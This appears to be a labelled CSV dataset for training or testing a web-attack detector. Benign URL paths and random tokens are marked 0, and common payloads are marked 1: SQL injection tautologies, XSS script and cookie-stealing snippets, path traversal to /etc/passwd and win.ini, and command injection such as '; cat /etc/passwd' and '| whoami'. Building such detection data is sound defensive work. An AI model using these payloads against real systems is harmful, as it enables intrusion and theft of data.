' OR 3=3 --,1
/search?session=94033,0
/checkout?session=40773,0
../../../windows/win.ini,1
/user?session=48695,0
rTtUxdXg6p3,0
admin%00' OR 1=1,1
' OR 4=1 --,1
search,0
/login?session=74721,0
/cart?session=10509,0
/user?session=37785,0
/settings?session=55533,0
contact,0
admin%00' OR 1=1,1
/blog?id=303,0
/index?id=9505,0
psbewvn0sVMq,0
contact,0
/contact?session=67789,0
/login?session=35907,0
kn4G7doS6S,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=9303,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=3 --,1
../../../../etc/passwd,1
/search?id=389,0
' OR 7=1 --,1
Ijs2vvJjdlL1x,0
/register?session=34662,0
<script>var a=435;alert(a)</script>,1
../../../windows/win.ini,1
/contact?id=7438,0
QZMBKqWhFd,0
A75cmoZz3A71MX,0
onerror=alert(1),1
index,0
home,0
/dashboard?id=3584,0
cart,0
' OR '1'='1,1
register,0
<script>var a=571;alert(a)</script>,1
/user?session=29668,0
3rjW96JgYOlWY,0
; cat /etc/passwd,1
' OR 5=8 --,1
' OR 3=7 --,1
/dashboard?session=89994,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/contact?session=40766,0
index,0
xV7c9eiJEJXJC8q,0
/register?session=94495,0
/search?session=89157,0
<script>var a=599;alert(a)</script>,1
/login?id=3187,0
admin%00' OR 1=1,1
9SkCRE6Q3C5kND,0
' OR 3=7 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cdybrDX9XmhHT,0
znM68lpLXZ81,0
/about?id=1484,0
/cart?session=49756,0
/settings?id=3889,0
' OR 1=7 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=329;alert(a)</script>,1
el6aV46l4RLJ2v,0
rbojiOvpsZ,0
' OR 9=8 --,1
' OR '1'='1,1
onerror=alert(1),1
checkout,0
onerror=alert(1),1
i36fi9DZSf9,0
' OR 8=8 --,1
| whoami,1
about,0
| whoami,1
../../../../etc/passwd,1
onerror=alert(1),1
home,0
' OR 4=4 --,1
' OR 5=2 --,1
contact,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=8525,0
/cart?session=60887,0
tXE3aq9GW9Iz3,0
1' o r '1'='1,1
/profile?id=3524,0
onerror=alert(1),1
admin' --,1
AkIYk52LqcB,0
s E l E c T * f R o M a d m i n,1
blog,0
/index?id=7372,0
<script>var a=226;alert(a)</script>,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=6;alert(a)</script>,1
search,0
/blog?id=940,0
' OR 4=9 --,1
admin%00' OR 1=1,1
/blog?id=9869,0
<script>var a=242;alert(a)</script>,1
/blog?id=6732,0
user,0
admin%00' OR 1=1,1
' OR 1=6 --,1
contact,0
<script>var a=749;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
<script>var a=992;alert(a)</script>,1
/checkout?session=91099,0
/blog?session=54802,0
/contact?id=3720,0
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=3 --,1
/search?id=8445,0
' OR '1'='1,1
bD70P61gkZzF3jI,0
<script>var a=934;alert(a)</script>,1
index,0
4nscK8LyAJ,0
<script>var a=140;alert(a)</script>,1
/login?id=5181,0
/cart?id=9452,0
../../../../etc/passwd,1
../../../../etc/passwd,1
' OR 8=1 --,1
/contact?id=8009,0
' OR 6=8 --,1
s E l E c T * f R o M a d m i n,1
/index?session=24540,0
/register?id=2375,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
admin' --,1
/register?session=21856,0
ooE739GCk,0
/cart?session=33425,0
/register?session=36827,0
<script>var a=934;alert(a)</script>,1
<script>var a=296;alert(a)</script>,1
<script>var a=302;alert(a)</script>,1
/contact?id=9862,0
s E l E c T * f R o M a d m i n,1
Pv3QoWqTCV6ib,0
s E l E c T * f R o M a d m i n,1
/checkout?id=2527,0
1' o r '1'='1,1
<script>var a=746;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 5=5 --,1
/register?id=676,0
cTXFiCUC9,0
/register?session=19160,0
/index?id=7403,0
/register?id=5589,0
/search?id=1700,0
<script>alert(document.cookie)</script>,1
/register?id=2692,0
<script>var a=276;alert(a)</script>,1
onerror=alert(1),1
onerror=alert(1),1
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=9 --,1
contact,0
' OR 9=7 --,1
admin' --,1
' OR 2=7 --,1
<script>alert(document.cookie)</script>,1
checkout,0
' OR 1=8 --,1
../../../windows/win.ini,1
/settings?id=2410,0
' OR '1'='1,1
2crdlYAFIy9lHz,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=7 --,1
' OR 8=4 --,1
' OR 7=1 --,1
/dashboard?session=93677,0
' OR 7=2 --,1
/profile?id=7367,0
sjJnvlPNU64,0
/profile?id=6284,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=9 --,1
/profile?id=7366,0
onerror=alert(1),1
' OR 5=9 --,1
/cart?session=98901,0
/profile?id=5741,0
../../../windows/win.ini,1
' OR 3=4 --,1
/cart?session=98275,0
<script>var a=484;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=6086,0
blog,0
JDYoxBF8ixWf,0
/login?session=61509,0
/login?session=75683,0
; cat /etc/passwd,1
/register?session=66897,0
../../../../etc/passwd,1
/blog?session=19740,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=99;alert(a)</script>,1
admin%00' OR 1=1,1
0rzUD5Ly1,0
/search?id=1527,0
login,0
<script>var a=399;alert(a)</script>,1
' OR 4=6 --,1
/search?id=3312,0
| whoami,1
/search?session=78466,0
/login?id=7645,0
/profile?id=2736,0
; cat /etc/passwd,1
nzP4aZPznv,0
PknVZJ7x,0
<script>var a=382;alert(a)</script>,1
0QPAZWlpkQh,0
<script>var a=132;alert(a)</script>,1
' OR 1=1 --,1
vHSKFmEVH,0
<script>var a=388;alert(a)</script>,1
/index?id=3301,0
blog,0
/cart?id=4251,0
' OR 2=7 --,1
' OR 3=3 --,1
<script>var a=609;alert(a)</script>,1
/about?session=59286,0
user,0
/home?id=3064,0
/checkout?id=1832,0
../../../windows/win.ini,1
/dashboard?id=6435,0
7NsCQ5mOHt2J5u,0
/home?session=53639,0
contact,0
s E l E c T * f R o M a d m i n,1
| whoami,1
user,0
<script>alert(document.cookie)</script>,1
<script>var a=613;alert(a)</script>,1
onerror=alert(1),1
onerror=alert(1),1
' OR '1'='1,1
<script>var a=244;alert(a)</script>,1
Taj4N6eXhc,0
/login?session=49724,0
search,0
/contact?session=98625,0
about,0
s E l E c T * f R o M a d m i n,1
home,0
admin' --,1
<script>var a=666;alert(a)</script>,1
/settings?id=5562,0
admin%00' OR 1=1,1
onerror=alert(1),1
javascript:alert(1),1
/register?id=2218,0
/home?id=9207,0
/contact?id=8410,0
javascript:alert(1),1
admin' --,1
onerror=alert(1),1
/register?session=97826,0
admin%00' OR 1=1,1
' OR 1=3 --,1
/search?session=37571,0
<script>var a=434;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
search,0
/blog?session=85883,0
admin' --,1
KfWcl29qh6xq,0
/cart?id=8456,0
/cart?id=1088,0
MSeoqCBS1,0
dashboard,0
2lyPXCItgoDFsx,0
register,0
/settings?id=3658,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=981;alert(a)</script>,1
search,0
/blog?id=1789,0
' OR 2=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
checkout,0
<script>var a=676;alert(a)</script>,1
/index?session=54111,0
<script>var a=431;alert(a)</script>,1
/home?session=80724,0
/search?session=56198,0
/index?session=64889,0
/login?id=8652,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=117;alert(a)</script>,1
contact,0
' OR 3=1 --,1
admin%00' OR 1=1,1
/user?session=98957,0
' OR 4=8 --,1
' OR 6=5 --,1
' OR 8=4 --,1
/profile?id=8032,0
index,0
' OR 6=7 --,1
/index?id=3569,0
../../../windows/win.ini,1
<script>var a=242;alert(a)</script>,1
/login?id=3363,0
' OR 6=2 --,1
<script>var a=449;alert(a)</script>,1
' OR 5=5 --,1
| whoami,1
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
/index?session=32749,0
fmJ7MRjWAVW,0
eqYMP5sCO0LGtm,0
contact,0
/blog?session=78052,0
' OR 1=7 --,1
../../../windows/win.ini,1
' OR 2=7 --,1
../../../../etc/passwd,1
<script>var a=455;alert(a)</script>,1
profile,0
user,0
/profile?session=10820,0
/home?id=4508,0
s E l E c T * f R o M a d m i n,1
/blog?session=86439,0
cart,0
' OR 8=9 --,1
7Vyr7NVnq,0
<script>var a=498;alert(a)</script>,1
YLFOBK5UKccuj,0
CCh7yBd2SfcW4z,0
s E l E c T * f R o M a d m i n,1
/dashboard?id=6704,0
search,0
javascript:alert(1),1
' OR 1=2 --,1
5vTkjzecNs,0
/index?id=5682,0
index,0
checkout,0
' OR 9=9 --,1
H78UqVAnd,0
' OR 6=2 --,1
; cat /etc/passwd,1
/home?session=53668,0
/settings?session=32736,0
/register?id=2108,0
dl2BiR104yrDWda,0
blog,0
/cart?session=97145,0
<script>var a=623;alert(a)</script>,1
; cat /etc/passwd,1
/about?id=2187,0
/checkout?id=7592,0
<script>var a=51;alert(a)</script>,1
' OR 4=6 --,1
cart,0
VOjbyubZ,0
blog,0
ivRTT4OqSt,0
TuGrZB6qA,0
/user?session=41394,0
EaWui65kw9,0
/checkout?id=4998,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
aT6jm19bl0,0
index,0
/search?session=67909,0
javascript:alert(1),1
IDUDZGsUM1Jv,0
admin%00' OR 1=1,1
blog,0
checkout,0
onerror=alert(1),1
/settings?id=7536,0
' OR '1'='1,1
/settings?id=4828,0
/index?session=59341,0
twKuEYxvb6,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=396;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/register?id=6517,0
6ivK0C68aomKJ,0
/blog?session=43795,0
UrSPVaAQC1wr,0
' OR 4=8 --,1
login,0
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=4 --,1
/contact?id=5748,0
U5PSEx8Btj,0
/settings?session=72790,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
B9aCQNYGweFO,0
onerror=alert(1),1
COGbMipmWnlc7,0
/about?session=23283,0
/home?id=5655,0
admin' --,1
' OR 3=7 --,1
/register?session=38754,0
' OR '1'='1,1
/cart?session=73337,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
4OBUOV09LuY,0
/dashboard?session=27607,0
<script>var a=903;alert(a)</script>,1
<script>var a=28;alert(a)</script>,1
' OR 8=6 --,1
' OR 5=1 --,1
' OR 7=8 --,1
/index?id=3327,0
/profile?id=9913,0
../../../../etc/passwd,1
1' o r '1'='1,1
cart,0
1' o r '1'='1,1
| whoami,1
/checkout?id=9803,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
about,0
/register?session=30399,0
Y9ofUdcxmPMg,0
onerror=alert(1),1
/dashboard?session=89067,0
/dashboard?id=6641,0
/home?id=8732,0
/about?id=4116,0
/settings?id=5580,0
/contact?id=9912,0
register,0
/search?id=4924,0
../../../windows/win.ini,1
' OR '1'='1,1
admin%00' OR 1=1,1
| whoami,1
<script>var a=401;alert(a)</script>,1
<script>var a=684;alert(a)</script>,1
onerror=alert(1),1
javascript:alert(1),1
' OR 4=9 --,1
' OR 1=7 --,1
<script>var a=944;alert(a)</script>,1
JEUsEXlJTEgFElb,0
' OR 6=1 --,1
<script>var a=75;alert(a)</script>,1
s1htT0DKpPvVc,0
<script>var a=997;alert(a)</script>,1
cart,0
/contact?session=18061,0
/home?id=9352,0
' OR 5=8 --,1
s E l E c T * f R o M a d m i n,1
<script>var a=171;alert(a)</script>,1
' OR '1'='1,1
| whoami,1
' OR 4=3 --,1
user,0
' OR 1=1 --,1
4RJWqNsGu4I58C,0
blog,0
' OR 1=1 --,1
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
/dashboard?id=319,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
<script>var a=530;alert(a)</script>,1
/about?session=64194,0
admin%00' OR 1=1,1
<script>var a=775;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/register?session=85752,0
' OR '1'='1,1
| whoami,1
' OR 6=6 --,1
' OR 8=9 --,1
register,0
login,0
../../../windows/win.ini,1
profile,0
/cart?session=11242,0
' OR 1=1 --,1
' OR 1=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
blog,0
vBSZsFmm,0
/about?session=90010,0
' OR 1=1 --,1
login,0
' OR '1'='1,1
' OR 7=3 --,1
1' o r '1'='1,1
cart,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
p7gkgF8IsLXL6,0
zZ8UowrH5XvBMa6,0
admin'/* bypass */OR 1=1,1
index,0
<script>var a=209;alert(a)</script>,1
' OR 3=4 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
<script>var a=986;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR 4=9 --,1
/settings?id=7127,0
../../../windows/win.ini,1
settings,0
1' o r '1'='1,1
register,0
../../../windows/win.ini,1
| whoami,1
/about?id=5874,0
admin'/* bypass */OR 1=1,1
/home?id=3783,0
../../../windows/win.ini,1
/cart?id=3218,0
/home?id=8210,0
s E l E c T * f R o M a d m i n,1
/settings?id=8229,0
' OR 1=1 --,1
onerror=alert(1),1
<script>var a=14;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
YXWwCMSZJKoEn,0
index,0
/cart?session=92162,0
/about?id=4787,0
onerror=alert(1),1
' OR 8=3 --,1
' OR 2=2 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
admin' --,1
XYWabMoiD323y,0
/profile?session=22463,0
Li9TJGWxPdR,0
/login?id=40,0
../../../windows/win.ini,1
/login?session=61424,0
onerror=alert(1),1
NzRzVAmWZzq9x3u,0
/register?id=2030,0
/settings?session=30471,0
<script>var a=607;alert(a)</script>,1
/blog?id=5595,0
' OR 1=1 --,1
/profile?session=32760,0
onerror=alert(1),1
' OR 4=7 --,1
/index?id=1062,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
6E84zSlNcee0nn,0
/profile?id=3927,0
/blog?session=60429,0
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
search,0
/cart?id=1877,0
settings,0
Kjpmm0TpCpmCw,0
/login?session=49636,0
' OR 3=9 --,1
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
/checkout?session=77993,0
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=462;alert(a)</script>,1
javascript:alert(1),1
/profile?session=86066,0
/dashboard?id=1622,0
/user?session=60791,0
../../../../etc/passwd,1
../../../../etc/passwd,1
zSVXltR7aj,0
1' o r '1'='1,1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=88881,0
user,0
/login?session=40696,0
/checkout?id=7648,0
; cat /etc/passwd,1
<script>var a=245;alert(a)</script>,1
index,0
; cat /etc/passwd,1
/register?session=98533,0
/register?session=96339,0
/about?id=829,0
admin' --,1
onerror=alert(1),1
checkout,0
/blog?session=31524,0
/about?id=2119,0
/user?id=517,0
dashboard,0
/blog?id=5608,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?id=6549,0
' OR 1=7 --,1
| whoami,1
cart,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
/contact?session=80182,0
profile,0
cart,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
<script>var a=828;alert(a)</script>,1
profile,0
/login?id=7805,0
s E l E c T * f R o M a d m i n,1
admin' --,1
; cat /etc/passwd,1
WhYaLgy3jwsyxWd,0
admin'/* bypass */OR 1=1,1
/checkout?id=1488,0
/register?session=59000,0
/checkout?id=7851,0
admin'/* bypass */OR 1=1,1
/cart?id=5264,0
admin'/* bypass */OR 1=1,1
8beBtpxzbXnrWqy,0
/contact?session=59552,0
' OR 5=2 --,1
jVeg2rUXccJ6lR,0
2ephFXHApnEc,0
about,0
contact,0
1' o r '1'='1,1
<script>var a=201;alert(a)</script>,1
/register?session=83597,0
' OR 1=1 --,1
/contact?session=46419,0
| whoami,1
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
wGWtgXRqZI,0
' OR 3=7 --,1
/blog?session=35765,0
' OR 5=6 --,1
/index?id=2359,0
/home?session=52170,0
profile,0
<script>var a=873;alert(a)</script>,1
user,0
/index?session=40000,0
zaqgzEa7iE4Erj,0
login,0
/dashboard?id=8437,0
' OR '1'='1,1
index,0
s E l E c T * f R o M a d m i n,1
' OR 3=6 --,1
<script>var a=466;alert(a)</script>,1
/checkout?id=1617,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?session=42145,0
/checkout?id=6595,0
onerror=alert(1),1
/checkout?session=88974,0
' OR '1'='1,1
' OR 5=7 --,1
/checkout?id=8014,0
' OR 4=8 --,1
/contact?id=2010,0
/user?session=87230,0
mLEaGeAGytyvQsD,0
blog,0
<script>var a=772;alert(a)</script>,1
; cat /etc/passwd,1
<script>var a=221;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
' OR 6=5 --,1
../../../windows/win.ini,1
/checkout?session=64444,0
/register?id=5656,0
/contact?session=55346,0
<script>var a=323;alert(a)</script>,1
' OR 9=2 --,1
/search?session=90276,0
checkout,0
/cart?session=49285,0
blog,0
/user?session=28115,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
/login?session=12430,0
about,0
<script>var a=646;alert(a)</script>,1
/about?session=61684,0
settings,0
<script>var a=552;alert(a)</script>,1
1' o r '1'='1,1
' OR '1'='1,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?session=76784,0
/home?session=27137,0
' OR 1=1 --,1
| whoami,1
V6MeQvXw2cHz,0
/search?id=5954,0
/settings?id=6299,0
/register?id=1259,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=40;alert(a)</script>,1
<script>var a=513;alert(a)</script>,1
<script>var a=386;alert(a)</script>,1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
blog,0
/register?id=6635,0
cart,0
contact,0
/settings?id=9060,0
/login?session=15475,0
<script>var a=316;alert(a)</script>,1
; cat /etc/passwd,1
/dashboard?id=2076,0
D6YD3L4HmZ,0
/home?id=4089,0
/about?session=67987,0
/contact?id=1429,0
../../../../etc/passwd,1
ahtB4kgUp9,0
<script>var a=893;alert(a)</script>,1
' OR 5=7 --,1
admin' --,1
/index?session=67506,0
../../../windows/win.ini,1
9OVcn8eTic5,0
/register?session=55581,0
<script>var a=400;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
search,0
<script>alert(document.cookie)</script>,1
' OR 7=8 --,1
/home?id=1055,0
javascript:alert(1),1
/checkout?session=51283,0
admin' --,1
admin' --,1
admin' --,1
index,0
profile,0
admin' --,1
/home?id=9522,0
<script>alert(document.cookie)</script>,1
index,0
/user?session=64082,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
' OR '1'='1,1
Y10kPEEKdEvF,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=1 --,1
' OR 8=3 --,1
/contact?session=70846,0
/cart?id=9221,0
' OR '1'='1,1
/index?session=47301,0
/about?session=16484,0
' OR '1'='1,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
../../../windows/win.ini,1
admin' --,1
../../../windows/win.ini,1
FkeYema4UWG7,0
VKJyWZg3JKPh5,0
<script>var a=803;alert(a)</script>,1
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=50977,0
../../../windows/win.ini,1
QzZQxSOLmYisDu8,0
' OR 6=2 --,1
admin%00' OR 1=1,1
../../../../etc/passwd,1
3CyYQfBVT,0
/profile?id=5919,0
<script>var a=482;alert(a)</script>,1
/register?id=1454,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
bmPVxIMtruyI,0
<script>var a=820;alert(a)</script>,1
' OR 9=7 --,1
<script>alert(document.cookie)</script>,1
/login?session=48875,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=263;alert(a)</script>,1
' OR 1=4 --,1
/blog?id=3595,0
cart,0
evFMaNyGvHdVTfM,0
settings,0
1' o r '1'='1,1
<script>var a=332;alert(a)</script>,1
; cat /etc/passwd,1
' OR 8=3 --,1
aIijsR65B,0
<script>var a=708;alert(a)</script>,1
register,0
<script>var a=70;alert(a)</script>,1
/search?id=859,0
/index?session=21612,0
PlezNaBgZxO,0
admin%00' OR 1=1,1
| whoami,1
' OR 5=4 --,1
/user?session=87050,0
8BtkO0sDXlCL73P,0
JBfAFM6rzwUnw,0
/about?id=1916,0
/cart?id=9566,0
cart,0
AHjQDVldO,0
; cat /etc/passwd,1
' OR 1=1 --,1
../../../../etc/passwd,1
contact,0
blog,0
/blog?session=42227,0
' OR 3=4 --,1
<script>var a=69;alert(a)</script>,1
/index?session=65313,0
<script>var a=640;alert(a)</script>,1
<script>var a=886;alert(a)</script>,1
/index?session=52606,0
/user?id=8,0
admin%00' OR 1=1,1
atw0OHkvGhOaaZa,0
; cat /etc/passwd,1
/dashboard?session=70840,0
' OR 1=1 --,1
<script>var a=634;alert(a)</script>,1
' OR 2=5 --,1
<script>alert(document.cookie)</script>,1
checkout,0
onerror=alert(1),1
' OR 9=4 --,1
/index?id=1300,0
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
/cart?id=6079,0
user,0
gsUfMHqdZuWfhgk,0
' OR 9=5 --,1
/search?session=92219,0
onerror=alert(1),1
admin' --,1
dashboard,0
/user?id=2119,0
<script>var a=189;alert(a)</script>,1
/profile?id=4572,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
' OR 1=5 --,1
../../../../etc/passwd,1
/index?session=80922,0
P3bcCwWXVc,0
javascript:alert(1),1
| whoami,1
| whoami,1
4fuEmzgQ,0
' OR 4=2 --,1
admin' --,1
' OR 2=9 --,1
admin'/* bypass */OR 1=1,1
login,0
' OR 8=9 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
' OR 3=1 --,1
admin' --,1
register,0
' OR 1=8 --,1
<script>var a=184;alert(a)</script>,1
onerror=alert(1),1
settings,0
1' o r '1'='1,1
/user?id=5654,0
/contact?session=23406,0
| whoami,1
' OR 9=5 --,1
admin' --,1
' OR 1=1 --,1
| whoami,1
wmxOCv8rEo1Vw,0
<script>var a=1;alert(a)</script>,1
1' o r '1'='1,1
ZrMdNlsmlZ2g1s,0
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
/checkout?id=671,0
<script>var a=751;alert(a)</script>,1
4yAl5RIt,0
../../../windows/win.ini,1
aDtjE6nLu5e,0
admin' --,1
<script>var a=553;alert(a)</script>,1
javascript:alert(1),1
<script>var a=389;alert(a)</script>,1
IWPATmKtffmJ,0
| whoami,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
<script>var a=668;alert(a)</script>,1
/profile?session=97499,0
checkout,0
<script>var a=454;alert(a)</script>,1
/checkout?session=12121,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
' OR 4=5 --,1
/dashboard?id=7788,0
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/profile?id=8697,0
admin%00' OR 1=1,1
index,0
TnMBUCaVvl,0
SQdHIBhymdB7N,0
home,0
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
search,0
s E l E c T * f R o M a d m i n,1
hfYVArSSRL7,0
/settings?id=974,0
cart,0
' OR 7=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
<script>var a=520;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/dashboard?id=1572,0
admin' --,1
register,0
/blog?session=55841,0
/home?session=89050,0
register,0
<script>var a=713;alert(a)</script>,1
<script>var a=280;alert(a)</script>,1
/register?id=1522,0
' OR 1=1 --,1
onerror=alert(1),1
../../../../etc/passwd,1
gAakeLjxgVtOzKg,0
../../../windows/win.ini,1
/home?session=87480,0
<script>var a=520;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
ZChZnhhgIj,0
' OR 2=5 --,1
admin'/* bypass */OR 1=1,1
' OR 4=5 --,1
JZOZTLQaxrPiPe,0
/profile?session=48232,0
dashboard,0
| whoami,1
/register?id=6229,0
UMERfXSufY3,0
; cat /etc/passwd,1
/login?id=7740,0
1' o r '1'='1,1
/search?id=8400,0
/login?id=6572,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?id=2486,0
| whoami,1
s E l E c T * f R o M a d m i n,1
LvMLT2Qy,0
contact,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
TroohRb4IHr,0
admin' --,1
search,0
' OR '1'='1,1
../../../windows/win.ini,1
<script>var a=772;alert(a)</script>,1
checkout,0
; cat /etc/passwd,1
GnJOFpjwhM,0
checkout,0
v5FMQ83zIaxU,0
profile,0
<script>alert(document.cookie)</script>,1
m6KGjPETz,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
Qxn1et8WwEDjnXs,0
/login?session=94212,0
contact,0
' OR '1'='1,1
' OR 1=1 --,1
<script>var a=732;alert(a)</script>,1
<script>var a=903;alert(a)</script>,1
../../../../etc/passwd,1
/blog?id=8478,0
' OR 3=4 --,1
/search?session=83006,0
checkout,0
<script>var a=637;alert(a)</script>,1
YE1kYORYo0v7,0
<script>var a=785;alert(a)</script>,1
17G0OFcH,0
' OR 1=1 --,1
/cart?session=42199,0
/register?session=60002,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin' --,1
6NLS8vsmCYwG0t,0
../../../windows/win.ini,1
/about?session=23433,0
/dashboard?session=71355,0
/user?id=5586,0
/user?id=283,0
/search?id=8345,0
4QQfbKxwyx,0
../../../../etc/passwd,1
<script>var a=896;alert(a)</script>,1
; cat /etc/passwd,1
9mnbNbbvBiH,0
../../../../etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
checkout,0
; cat /etc/passwd,1
mVeYEu3IwU3Zf,0
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
/login?session=58413,0
/home?id=7586,0
| whoami,1
' OR 6=2 --,1
/profile?id=3316,0
/settings?session=19312,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
<script>var a=795;alert(a)</script>,1
/user?session=67456,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
admin' --,1
oifMpHMFe,0
cart,0
yhUKb2QdEyHD,0
/checkout?session=92455,0
/contact?session=37737,0
admin'/* bypass */OR 1=1,1
settings,0
admin' --,1
settings,0
admin' --,1
/login?session=90586,0
checkout,0
onerror=alert(1),1
cgBj4vss,0
s E l E c T * f R o M a d m i n,1
/login?session=29236,0
<script>var a=786;alert(a)</script>,1
cart,0
/home?id=1,0
/user?id=5256,0
register,0
admin'/* bypass */OR 1=1,1
| whoami,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
| whoami,1
<script>var a=161;alert(a)</script>,1
/cart?id=5477,0
/cart?id=6796,0
l81E686L,0
search,0
<script>var a=417;alert(a)</script>,1
/settings?session=21870,0
/about?id=5608,0
' OR '1'='1,1
/blog?id=6840,0
admin' --,1
; cat /etc/passwd,1
<script>var a=388;alert(a)</script>,1
/login?session=45213,0
<script>var a=500;alert(a)</script>,1
../../../../etc/passwd,1
/register?id=3666,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
../../../../etc/passwd,1
cart,0
login,0
user,0
cart,0
Zj9BcbBO3M,0
/profile?session=46863,0
user,0
/index?id=1696,0
' OR 9=8 --,1
; cat /etc/passwd,1
/user?id=6898,0
../../../windows/win.ini,1
' OR '1'='1,1
/blog?id=5129,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
user,0
../../../../etc/passwd,1
' OR '1'='1,1
/index?session=77378,0
/search?session=87053,0
' OR '1'='1,1
/contact?id=2687,0
<script>alert(document.cookie)</script>,1
<script>var a=464;alert(a)</script>,1
/cart?session=74480,0
Pq5hhHyu24Otl,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
